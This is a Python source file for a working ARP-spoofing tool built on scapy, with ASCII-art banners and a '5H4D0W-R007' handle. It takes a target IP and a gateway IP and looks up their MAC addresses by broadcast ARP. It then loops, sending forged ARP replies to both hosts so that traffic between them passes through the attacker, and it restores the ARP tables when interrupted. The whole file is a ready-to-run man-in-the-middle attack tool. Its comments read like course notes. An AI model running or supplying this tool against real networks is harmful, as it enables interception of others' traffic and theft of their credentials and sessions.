#!/usr/bin/env python

import scapy.all as scapy
import time
import optparse

print('''
    ___    ____  ____  _____                   ____
   /   |  / __ \/ __ \/ ___/____  ____  ____  / __/__  _____
  / /| | / /_/ / /_/ /\__ \/ __ \/ __ \/ __ \/ /_/ _ \/ ___/
 / ___ |/ _, _/ ____/___/ / /_/ / /_/ / /_/ / __/  __/ /
/_/  |_/_/ |_/_/    /____/ .___/\____/\____/_/  \___/_/
                        /_/
''')

print(r'''
      _____                   _______                   _____          
     |\    \                 /::\    \                 /\    \         
     |:\____\               /::::\    \               /::\    \        
     |::|   |              /::::::\    \              \:::\    \       
     |::|   |             /::::::::\    \              \:::\    \      
     |::|   |            /:::/~~\:::\    \              \:::\    \     
     |::|   |           /:::/    \:::\    \              \:::\    \    
     |::|   |          /:::/    / \:::\    \              \:::\    \   
     |::|___|______   /:::/____/   \:::\____\              \:::\    \  
     /::::::::\    \ |:::|    |     |:::|    |              \:::\    \ 
    /::::::::::\____\|:::|____|     |:::|    |_______________\:::\____\
   /:::/~~~~/~~       \:::\    \   /:::/    / \::::::::::::::::::/    /
  /:::/    /           \:::\    \ /:::/    /   \::::::::::::::::/____/ 
 /:::/    /             \:::\    /:::/    /     \:::\~~~~\~~~~~~       
/:::/    /               \:::\__/:::/    /       \:::\    \            
\::/    /                 \::::::::/    /         \:::\    \           
 \/____/                   \::::::/    /           \:::\    \          
                            \::::/    /             \:::\    \         
                             \::/____/               \:::\____\        
                              ~~                      \::/    /        
                                                       \/____/         
''')

def get_values():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="targetip", help="IP address of target ------ 5H4D0W-R007 -------")
    parser.add_option("-s", "--source", dest="sourceip", help="IP address to be spoofed with ------ 5H4D0W-R007 -------")
    (values, attributes) = parser.parse_args()
    if not values.targetip and not values.sourceip:
        parser.error("[-] use --help for more info")
    if not values.targetip:
        parser.error("[-] Please specify target IP, use --help for more info")
    if not values.sourceip:
        parser.error("[-] Please specify source IP, use --help for more info")
    return values

def get_mac(ip):
    #scapy.arping(ip)   -> arp requests directed to broadcast MAC

    arp_request = scapy.ARP(pdst = ip)   # 1. set IP to pdst field in ARP Class
    #scapy.ls(scapy.ARP())
    #arp_request.show()
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")          # 2. set destination MAC to broadcast MAC in Ether Class
    #scapy.ls(scapy.Ether())
    #broadcast.show()
    arp_request_broadcast = broadcast/arp_request  # combining frames
    #arp_request_broadcast.show()
    #print(arp_request.summary())
    #  srp() returns 2 lists, answered & unanswered
    answered_summary, unanswered_summary = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False) #remove extra details
    #print(answered_summary.summary())
    return answered_summary[0][1].hwsrc #1st element`s IP

def spoof(target_ip,spoof_ip):
    #scapy.ls(scapy.ARP)
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #op=1->request packet
    #pdst,hwdst is IP and MAC of target
    #psrc=IP of router/AP

    # print(packet.show())
    # print(packet.summary())

    scapy.send(packet, verbose=False)
    #packet to be sent, we only want custom output to be displayed

def restore(destination_ip, source_ip):
    # To restore the ARP table
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


values = get_values()
targetip = values.targetip
sourceip = values.sourceip
counter_packets = 0
try:
    while 1:
        spoof(targetip,sourceip) #to victim
        spoof(sourceip,targetip) #to router
        counter_packets = counter_packets+2
        print("\r[+] "+str(counter_packets)+" packets sent",end="")  # To print in same line
        #sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[-] Detected an interrupt. Resetting ARP tables...")
    time.sleep(2)
    print("[-] Quitting...")
    restore(targetip, sourceip) #restore victim`s ARP table
    restore(sourceip, targetip) #restore router`s ARP table
